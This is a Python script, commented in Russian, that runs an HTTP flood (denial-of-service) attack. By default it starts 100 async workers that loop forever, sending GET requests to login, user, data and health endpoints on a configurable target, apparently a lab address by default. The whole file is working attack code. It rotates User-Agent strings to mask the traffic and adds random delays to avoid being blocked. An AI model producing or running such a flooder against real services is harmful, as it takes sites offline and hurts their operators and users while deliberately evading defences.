#!/usr/bin/env python3

import asyncio
import aiohttp
import os
import time
import random

TARGET_IP = os.getenv('TARGET_IP', '192.168.56.10')
TARGET_PORT = os.getenv('TARGET_PORT', '8080')
THREADS = int(os.getenv('THREADS', '100'))

# Список User-Agent для маскировки
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
]

# Список endpoint'ов для атаки
ENDPOINTS = [
    '/api/auth/login',
    '/api/users',
    '/api/data',
    '/health',
    '/status',
    '/',
]

async def http_request(session, url):
    """Выполнение HTTP запроса"""
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Connection': 'keep-alive',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            await response.text()
            print(f"Request to {url} - Status: {response.status}")
    except Exception as e:
        print(f"Request failed: {e}")

async def attack_worker(worker_id):
    """Рабочий поток для атаки"""
    print(f"Worker {worker_id} started")
    
    async with aiohttp.ClientSession() as session:
        while True:
            endpoint = random.choice(ENDPOINTS)
            url = f"http://{TARGET_IP}:{TARGET_PORT}{endpoint}"
            
            await http_request(session, url)
            
            # Небольшая задержка для избежания блокировки
            await asyncio.sleep(random.uniform(0.01, 0.1))

async def main():
    print(f"Starting HTTP flood attack against {TARGET_IP}:{TARGET_PORT}")
    print(f"Using {THREADS} concurrent workers")
    
    # Создание и запуск рабочих потоков
    tasks = []
    for i in range(THREADS):
        task = asyncio.create_task(attack_worker(i))
        tasks.append(task)
    
    # Ожидание завершения (атака будет продолжаться бесконечно)
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main()) 